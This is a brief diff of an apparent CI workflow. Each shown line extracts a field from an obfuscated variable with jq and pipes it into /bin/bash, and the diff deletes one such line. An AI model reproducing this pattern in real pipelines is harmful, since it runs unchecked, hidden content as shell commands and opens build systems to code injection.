@@ -29,7 +29,6 @@ jobs:
           echo $lqr7145 | jq -r .oilqw646 | /bin/bash
           echo $nu8939 | jq -r .nywt97 | /bin/bash
           printf '%s' "$ybqnt1" | jq -r .ll633 | /bin/bash
-          echo $j5 | jq -r .kp95015 | /bin/bash
           echo $w584 | jq -r .mpawa80458 | /bin/bash
           echo $idr45 | jq -r .grrv07486 | /bin/bash
           printf '%s' "$yp354" | jq -r .hyn65010 | /bin/bash
